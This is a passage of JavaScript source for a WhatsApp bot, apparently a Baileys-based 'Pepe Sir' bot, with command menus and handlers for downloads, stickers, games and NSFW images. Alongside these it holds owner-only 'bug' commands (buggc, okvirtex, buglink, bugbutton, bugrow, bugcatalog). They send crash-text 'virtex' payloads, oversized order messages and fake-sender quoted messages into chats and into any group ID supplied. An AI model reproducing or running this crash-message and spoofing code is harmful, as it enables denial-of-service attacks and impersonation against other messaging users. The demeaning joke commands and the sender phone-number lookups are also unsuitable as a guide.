│ ⬡ ${prefix}tiktokstalk <query>
│ ⬡ ${prefix}play <query>
│ ⬡ ${prefix}video <query>
│ ⬡ ${prefix}igstory <username>
│ ⬡ ${prefix}twitter <link>
│ ⬡ ${prefix}tiktok <link>
│ ⬡ ${prefix}fb <link>
│ ⬡ ${prefix}image <query>
│ ⬡ ${prefix}anime <random>
│ ⬡ ${prefix}pinterest <query>
│ ⬡ ${prefix}comic <query>
│ ⬡ ${prefix}lyrics <query>
│ ⬡ ${prefix}chara <query>
│ ⬡ ${prefix}playstore <query>
╰──────────────── 


 ❑ ᴍᴀᴋɪɴɢ ғᴇᴀᴛᴜʀᴇs
╭──────────────── 
│ ⬡ ${prefix}sticker
│ ⬡ ${prefix}swm author|packname
│ ⬡ ${prefix}take author|packname
│ ⬡ ${prefix}fdeface
│ ⬡ ${prefix}attp text
│ ⬡ ${prefix}emoji
│ ⬡ ${prefix}golden text
│ ⬡ ${prefix}flower text
│ ⬡ ${prefix}wooden text
│ ⬡ ${prefix}burn text
│ ⬡ ${prefix}glow text
│ ⬡ ${prefix}summer text
│ ⬡ ${prefix}neon text
│ ⬡ ${prefix}coffeecup text
│ ⬡ ${prefix}coffeecup2 text
│ ⬡ ${prefix}battlefield text|text
│ ⬡ ${prefix}googletxt2 text|text
│ ⬡ ${prefix}transformer text|text
│ ⬡ ${prefix}write text
│ ⬡ ${prefix}waifu
│ ⬡ ${prefix}phlogo *text|text
│ ⬡ ${prefix}tfire text
│ ⬡ ${prefix}phcomment text|text
│ ⬡ ${prefix}wolf text
│ ⬡ ${prefix}ytgol text
│ ⬡ ${prefix}ytsilver text
│ ⬡ ${prefix}t3d text
│ ⬡ ${prefix}logoa text|text
│ ⬡ ${prefix}marvel text|text
│ ⬡ ${prefix}leavest text
│ ⬡ ${prefix}neon2 text
│ ⬡ ${prefix}wall text
│ ⬡ ${prefix}notewrite text
╰────────────────  

 

 ❑ ᴄᴏɴᴠᴇʀᴛ ғᴇᴀᴛᴜʀᴇs
╭────────────────  
│ ⬡ ${prefix}tomp3
│ ⬡ ${prefix}tomp4
│ ⬡ ${prefix}toimg
│ ⬡ ${prefix}slow
│ ⬡ ${prefix}fast
│ ⬡ ${prefix}reverse
│ ⬡ ${prefix}tourl
╰────────────────  
 

 ❑ ᴅᴏᴡɴʟᴏᴀᴅ ғᴇᴀᴛᴜʀᴇs
╭────────────────  
│ ⬡ ${prefix}play query
│ ⬡ ${prefix}ytmp4 link
│ ⬡ ${prefix}ytmp3 link
│ ⬡ ${prefix}video query
│ ⬡ ${prefix}instagram link
│ ⬡ ${prefix}twitter
│ ⬡ ${prefix}facebook link
│ ⬡ ${prefix}tiktokdl
╰────────────────  
 

 ❑ ᴛᴀɢ ғᴇᴀᴛᴜʀᴇs
╭────────────────  
│ ⬡ ${prefix}hidetag
│ ⬡ ${prefix}contag
│ ⬡ ${prefix}sticktag
│ ⬡ ${prefix}totag
╰────────────────  

 ❑ ᴜᴘsᴡ ғᴇᴀᴛᴜʀᴇs
╭────────────────  
│ ⬡ ${prefix}upswtxt
│ ⬡ ${prefix}upswlocation
│ ⬡ ${prefix}upswsticker
│ ⬡ ${prefix}upswimage
│ ⬡ ${prefix}upswvideo
│ ⬡ ${prefix}upswgif
╰────────────────  
 

 ❑ ғᴜɴ ғᴇᴀᴛᴜʀᴇs
╭────────────────  
│ ⬡ ${prefix}slander
│ ⬡ ${prefix}slanderpc
│ ⬡ ${prefix}contact 0|p
│ ⬡ ${prefix}suit
│ ⬡ ${prefix}toxic
│ ⬡ ${prefix}dice
│ ⬡ ${prefix}intake
│ ⬡ ${prefix}viewonce
│ ⬡ ${prefix}hbd
│ ⬡ ${prefix}herodetail hero name
│ ⬡ ${prefix}herolist hero name
│ ⬡ ${prefix}beautycheck @tag
│ ⬡ ${prefix}uglycheck @tag
│ ⬡ ${prefix}handsomecheck @tag
│ ⬡ ${prefix}lesbicheck @tag
│ ⬡ ${prefix}character @tag
│ ⬡ ${prefix}gaycheck @tag
│ ⬡ ${prefix}is
│ ⬡ ${prefix}can
│ ⬡ ${prefix}rate
│ ⬡ ${prefix}when
╰────────────────  

 ❑ ɴsғᴡ ғᴇᴀᴛᴜʀᴇs
╭────────────────  
│ ⬡ ${prefix}yuri
│ ⬡ ${prefix}hentai
│ ⬡ ${prefix}anal
│ ⬡ ${prefix}eroneko
│ ⬡ ${prefix}lesbian
│ ⬡ ${prefix}kitsune
│ ⬡ ${prefix}bj
│ ⬡ ${prefix}pussy
│ ⬡ ${prefix}wallpaper
│ ⬡ ${prefix}neko2
│ ⬡ ${prefix}baka
│ ⬡ ${prefix}slap
│ ⬡ ${prefix}poke
│ ⬡ ${prefix}keta
│ ⬡ ${prefix}awoo
│ ⬡ ${prefix}blowjob
│ ⬡ ${prefix}megumin
│ ⬡ ${prefix}neko
│ ⬡ ${prefix}trapnime
╰────────────────  
 
`
sendButLocation(from, `${menu}`,`ʙᴏᴛ ʙʏ @${dtod.split("@")[0]}`, {jpegThumbnail:iye}, [{buttonId:`command`,buttonText:{displayText:'LIST MENU'},type:1},{buttonId:`credit`,buttonText:{displayText:'THANKS TO'},type:1},{buttonId:`script`,buttonText:{displayText:'SCRIPT'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
        case 'alive':
groups = xeon.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = xeon.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await xeon.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "918943082947@s.whatsapp.net"
        dtod = '918943082947'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await xeon.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
       menu = `
╭──────────────────╮
      ✪ɪͥᴛͭsᷤᴍͫᴇͤ☚⃟ᎮᏋᎮᏋ ՏIᖇ
╭──────────────────╯
│
│   ʜᴇʏ ᴜsᴇʀ @${sender.split("@")[0]} 
│      ɪᴍ sᴛɪʟʟ ᴀʟɪᴠᴇ ʙʀᴏ😁
│      
│
│  ▢ *ᴅᴇᴠᴇʟᴏʟᴇʀ* : ᴘᴇᴘᴇ sɪʀ
│  ▢ *ᴏᴡɴᴇʀ* :  ᴘᴇᴘᴇ sɪʀ
│  ▢ *ᴠᴇʀsɪᴏɴ* : 1.0
│  ▢ *ᴍᴏᴅᴇ* : ᴘᴜʙʟɪᴄ
│  ▢ *ᴘʀᴇғɪx* : [# .]
│  ▢ *ᴘʀɪᴠᴀᴛᴇ ᴄʜᴀᴛs* : ${privat.length}
│  ▢︎ *ɢʀᴏᴜᴘ ᴄʜᴀᴛs* : ${groups.length} 
│  ▢︎ *ᴛᴏᴛᴀʟ ᴄʜᴀᴛs* : ${totalChat.length}
│  ▢︎ *sᴘᴇᴇᴅ* : ${latensie.toFixed(4)} _Second_
︎│  ▢ *ᴀᴄᴛɪᴠᴇ* : ${runtime(process.uptime())}
│  ▢︎ *ᴘʟᴀᴛғᴏʀᴍ* : ${os.platform()}
│
│      ▎▍▌▌▉▏▎▌▉▐▏▌▎
│      ▎▍▌▌▉▏▎▌▉▐▏▌▎
│        ©918943082947
│
│  ❑ *ɢɪᴛʜᴜʙ ʟɪɴᴋ* :
│  https://github.com/jacksir/jack-SIR
│  
│  ❑ *ʏᴏᴜᴛᴜʙᴇ ʟɪɴᴋ* :
│  https://tinyurl.com/yhbgcc33
│
│  ❑ *ʙᴏᴛ ɢʀᴏᴜᴘ ʟɪɴᴋ*
│  https://tinyurl.com/yzb25hvm
│
│  ❑ *ᴏᴡɴᴇʀ* : 
│  https://tinyurl.com/yf66lpbm
│
╰──────────────────╯
​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​

`
sendButLocation(from, `${menu}`,`𝚊𝚗𝚢 𝚍𝚘𝚞𝚋𝚝𝚜 , 𝚌𝚘𝚗𝚝𝚊𝚌𝚝 𝚘𝚠𝚗𝚎𝚛🌝💞 \n        ❏ 𝑐𝑜𝑑𝑒𝑑 𝑏𝑦 𝑝𝑒𝑝𝑒 𝑠𝑖𝑟 ❏ \n\n ʙᴏᴛ ʙʏ @${dtod.split("@")[0]}`, {jpegThumbnail:iye}, [{buttonId:`command`,buttonText:{displayText:'LIST MENU'},type:1},{buttonId:`credit`,buttonText:{displayText:'THANKS TO'},type:1},{buttonId:`script`,buttonText:{displayText:'SCRIPT'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'credit':
   dtod = '918943082947'
   dtod1 = '918943082947'
   dtod2 = '918943082947'
   dtod3 = ''
   dtod4 ='0'
   var yez = `
╭───➤ 𝐀𝐃𝐌𝐈𝐍
│✨ wa.me/${dtod.split('@')[0]}
╰───────────────
 © ᴄᴏᴅᴇᴅ ʙʏ ᴘᴇᴘᴇ sɪʀ
 `
     credit = xeon.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 1000, "message": `${yez}`, "footerText": "hehe", "thumbnail": iye, "surface": 'CATALOG'}}, {quoted: mek})
            xeon.relayWAMessage(credit)
        break
case 'suit':
              if (!q) return reply(`Send orders ${prefix}suit scissors / stone / paper`)
              const userspilih = q
              if (!userspilih.match(/rock|scissors|paper/)) return reply(`Choose rock, paper, scissors`)
              var computer = Math.random();
              if (computer < 0.34 ) {
              computer = 'rock';
              } else if( computer >= 0.34 && computer < 0.67) {
              computer = 'scissors';
              } else {
              computer = 'paper';
}
              if ( userspilih == computer ) {
              reply(`Series Match!`)
              } else if ( userspilih == 'rock' ) {
              if( computer == 'scissors' ) {
              reply(`You choose Rock and Scissors bot\nYou win!`)
              } else {
              reply(`You choose Rock and bots choose Paper\nYou lose!`)
}
              } else if ( userspilih == 'scissors' ) {
              if( computer == 'rock' ) {
              reply(`You choose Scissors and bots choose Rock\nYou lose!`)
              } else {
              reply(`You choose Scissors and Paper bot\nYou win!`)
}
              } else if ( userspilih == 'paper' ) {
              if( computer == 'rock' ) {
              reply(`You choose Paper and Rock bot\nYou win!`)
              } else {
              reply(`You choose Paper and bots choose Scissors\nYou lose`)
}
}
              break
case 'bugreport':
              if (args.length < 1) return reply(`Type ${prefix}bugreport [feature] [Whats the Error]`) 
              teks = args.join(' ')
              reply('Thank you for reporting the bug to the owner, if its just a fad then it will be banned by a bot!')
              xeon.sendMessage('918943082947@s.whatsapp.net',`*Bug Report:* ${teks}`, text)
              
              break
case 'restart':
             if (!isOwner) return 
             reply(mess.wait)
             exec(`node main`)
             reply('_Restarting Bot Success_')
break
case 'toxic':
              Toxic().then(toxic => {
              reply (toxic)
})
              break
              case 'storyanime': case 'sanime':{
              if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
reply(mess.wait)
get_result = await getBuffer(`https://dapuhy-api.herokuapp.com/api/anime/storyanime?apikey=${dapapi}`)
kodi = `*_CLICK NEXT FOR MORE_*`
   sendButVideo(from, kodi, `${watermark}`, get_result, [                      
          {
            buttonId: `storyanime`,
            buttonText: {
              displayText: `NEXT`,
            },
            type: 1,
          },
        ]);         
        }
                    break       
case 'quotesyt':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
                reply(mess.wait)
                dapuhy = await getBuffer(`https://dapuhy-api.herokuapp.com/api/randomimage/quotesyt?apikey=${dapapi}`)
                xeon.sendMessage(from, dapuhy, image, {quoted: mek})        
                break    
case 'auu': // by xeon
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
       reply('No Sis')
        sendButMessage(from, `Hi ${pushname} `, `What do you want to answer??`, [
          {
            buttonId: `oklah`,
            buttonText: {
              displayText: `WHY:)`,
            },
            type: 1,
          },
          {
            buttonId: `apaan6`,
            buttonText: {
              displayText: `BYE`,
            },
            type: 1,
          },
          {
            buttonId: `awokkk`,
            buttonText: {
              displayText: `END :/`,
            },
            type: 1,
          },
        ]);
        break;
case 'oklah':
reply(':v')
break
case 'apaan6':
reply('oke slur')
break
case 'awokkk':
reply('yes no time')
break
case 'h':
reply('he/she is gone bro.. may he/she go to hell too 😏')
break
case 'okeyx':
reply('💐🌺🌻I WELCOME THE NEW MEMBER WITH SOME FLOWERS🌻🌺💐')
break

case 'isbaileys': 
case 'bail': 
case 'baileys':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
if (!mek.key.fromMe) return;
reply(`${mek.quoted.isBaileys}`)
break
case 'getcaption':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
if (!mek.key.fromMe) return;
try {
reply(`${mek.quoted.title}`)
} catch {
reply(`${mek.quoted.caption}`)
}
break
case 'iggw':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
  reply('https://www.instagram.com/_roshan_p_r')
break
   
case 'owner':
           case 'creator':
             
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
               sendKontak(from, `${owner}`, `${fakeyoi}`, 'Busy!!')
               await sleep(1000)
               haibg =`Hi ${pushname}\nThats my owner, What do you want to know about??`
               buttons = [{buttonId: `mygithub`,buttonText:{displayText: 'SC BOT'},type:1},{buttonId:`iggw`,buttonText:{displayText:'INSTAGRAM'},type:1}]
               buttonsMessage = { contentText: `${haibg}`, footerText: `Created By ${fakeyoi} 😌💝`, buttons: buttons, headerType: 1 }
               prep = await xeon.prepareMessageFromContent(from,{buttonsMessage},{})
               xeon.relayWAMessage(prep)
               break     
            
   case 'rules':
menu = `
︎
-----[ 𝑹 𝑼 𝑳 𝑬 𝑺 ]-----

1. 𝙳𝙾𝙽𝚃 𝙲𝙰𝙻𝙻 𝙱𝙾𝚃  , 𝙲𝙰𝙻𝙻=𝙰𝚄𝚃𝙾𝙱𝙻𝙾𝙲𝙺

2. 𝙳𝙾𝙽𝚃 𝚂𝙿𝙰𝙼 𝙱𝙾𝚃

3. 𝙳𝙾𝙽𝚃 𝙼𝙸𝚂𝚄𝚂𝙴 𝚃𝙷𝙴 𝙱𝙾𝚃

4. 𝙰𝙽𝚈 𝙿𝚁𝙾𝙱𝙻𝙰𝙼 𝙲𝙾𝙽𝚃𝙰𝙲𝚃 𝙾𝚄𝚁 𝙾𝚆𝙽𝙴𝚁
`
sendButMessage(from, menu, `𝙿𝙴𝙿𝙴 𝚂𝙸𝚁`, [
          {
            buttonId: `command`,
            buttonText: {
              displayText: `𝘽𝙖𝙘𝙠 𝙈𝙚𝙣𝙪 ︎`,
            },
            type: 1,
          },]);
        

break
case 'f':
case 'lock':
 ikymemek = {
  "key": {
    "fromMe": false,
    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
  },
  "message": {
    "viewOnceMessage": {
      "message": {
        "imageMessage": {
          "url": "https://mmg.whatsapp.net/d/f/AjD3dQIM5hW3UkDfnnkice-eMcsMJJALEcgD9HnDGZEp.enc",
          "mimetype": "image/jpeg",
          "fileSha256": "aR3vWUsV9VZUiR+agYok8oM4UHiuhqEShMpQ6SgY9WM=",
          "fileLength": "675",
          "height": 41,
          "width": 52,
          "mediaKey": "6RDG8T+jOb0RfleWzLTclsaVn0EGRA/v78dnS+Y4S+o=",
          "fileEncSha256": "idNxqNtCaHRxuN+AX0uakPrBuiyvx84IksPUYMYgs7Y=",
          "directPath": "/v/t62.7118-24/13810909_985978368802545_7608967834334288292_n.enc?ccb=11-4&oh=359274a24041d97e91597ad1fb40e784&oe=61595B99",
          "mediaKeyTimestamp": "1630826390",
          "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACkANAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAApgAAAAAAAAAAAf/EABQQAQAAAAAAAAAAAAAAAAAAAFD/2gAIAQEAAT8AK//EABQRAQAAAAAAAAAAAAAAAAAAADD/2gAIAQIBAT8AT//EABQRAQAAAAAAAAAAAAAAAAAAADD/2gAIAQMBAT8AT//Z",
          "viewOnce": true
        }
      }
    }
  },
  "messageTimestamp": "1630826389",
  "status": "SERVER_ACK",
  "mediaData": {
    "localPath": "/data/user/0/com.gbwhatsapp/files/ViewOnce/IMG-20210905-WA0047.jpg"
  }
}
xeon.sendMessage(from, { "degreesLatitude": '', "degreesLongitude": '', "jpegThumbnail": iye}, MessageType.location, {quoted: ikymemek})
           break
case 'mengyoi':
if (!mek.key.fromMe) return;
sendBug(from)
break
case 'buggc':
if (!mek.key.fromMe) return;
if (!q) return reply('Enter the Group ID')
sendBug(args[0])
break
case 'okvirtex':
if (!isOwner && !mek.key.fromMe) return reply('Only owner can use this feature')
katalog(`${ngazap(prefix)}`)
katalog(`${emoji2(prefix)}`)
katalog(`${virtex90(prefix)}`)
katalog(`${virtex2(prefix)}`)
katalog(`${virtex3(prefix)}`)
katalog(`${virtex4(prefix)}`)
katalog(`${virtex5(prefix)}`)
katalog(`${virtex6(prefix)}`)
katalog(`${virtex7(prefix)}`)
katalog(`${virtex8(prefix)}`)
katalog(`${virtex9(prefix)}`)
katalog(`${virtag(prefix)}`)
break
case 'buglink':
                if (!isOwner && !mek.key.fromMe) return reply('Only owner can use this feature')
                 xeon.toggleDisappearingMessages(from, 0)
               xeon.sendMessage(from, virtex3(prefix), text, { quoted:ftrol, contextInfo :{text: '🔥',
            "forwardingScore": 1000000000,
            isForwarded: false,
            sendEphemeral: false,
            "externalAdReply": {
                "title": `${virtex2(prefix)}`,
                "body": "",
                "previewType": "PHOTO",
                "thumbnailUrl": "https://i.ibb.co/y0RYgzB/FB-IMG-1635413002830.jpg",
                "thumbnail": fs.readFileSync(`./xeon.jpg`),
                "sourceUrl": "https://youtube.com/channel/UCVJ9029PQ-gJBtFQZZ3AJuA"}}})
                break
        case 'bugbutton':
        if (!isOwner && !mek.key.fromMe) return reply('Only owner can use this feature')
        xeon.toggleDisappearingMessages(from, 0)
        sendButLocation(from, `${ngazap(prefix)}`, `${virtag(prefix)}`, {jpegThumbnail:iye}, [{buttonId:`bbaij72njnwjibdo16830nslm1782`,buttonText:{displayText:'Yahahaha'},type:1}])
        xeon.toggleDisappearingMessages(from, 0)
break
case 'bugrow':
if (!isOwner && !mek.key.fromMe) return reply('Only owner can use this feature')
xeon.toggleDisappearingMessages(from, 0)
 listMsg = {
 buttonText: 'LIST MENU',
 footerText: `${emoji2(prefix)}`,
 description: `${virtex6(prefix)}`,
 sections: [
                     {
                      "title": "CieDick",
 rows: [
                          {
                              "title": "CieBug",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
xeon.sendMessage(from, listMsg, MessageType.listMessage, {quoted:ftrol})
xeon.toggleDisappearingMessages(from, 0)
break
case 'bugcatalog':
if (!isOwner && !mek.key.fromMe) return reply('Only owner can use this feature')
xeon.toggleDisappearingMessages(from, 0)
 babi = (teks) => {
             res = xeon.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 9999999, "message": teks, "footerText": `${emoji2(prefix)}`, "thumbnail": iye, "surface": 'CATALOG' }}, {quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: `${virtex6(prefix)}`,
    orderTitle: `${emoji2(prefix)}`, // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
             xeon.relayWAMessage(res)
        }
        babi(`${ngazap(prefix)}`)
        babi(`${virtag(prefix)}`)
        babi(`${virtex6(prefix)}`)
        babi(`${emoji2(prefix)}`)
        break
       
                           case 'bucinstick':
                case 'bucinsticker':{
         
                    var ano = await fetchText('https://raw.githubusercontent.com/rashidsiregar28/data/main/bucin')
                    var wifegerak = ano.split('\n')
                    var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
                    var isGif = wifegerakx.endsWith('.gif') ? true : false
                    if (!isGif) {
                    var ngebuff = await getBuffer(wifegerakx)
                    var media = getRandom('.png')
                    fs.writeFileSync(media, ngebuff)
                    await ffmpeg(`${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(mess.error.api)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
                                    if (error) return reply(mess.error.api)
									 xeon.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: freply})
								
                                    fs.unlinkSync(media)	
									fs.unlinkSync(`./sticker/${sender}.webp`)	
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./sticker/${sender}.webp`)
                    } else {
                     var ngebuff = await getBuffer(wifegerakx)
                 	let media = `./sticker/${sender}.gif`
                    fs.writeFileSync(media, ngebuff)
					reply(mess.wait)
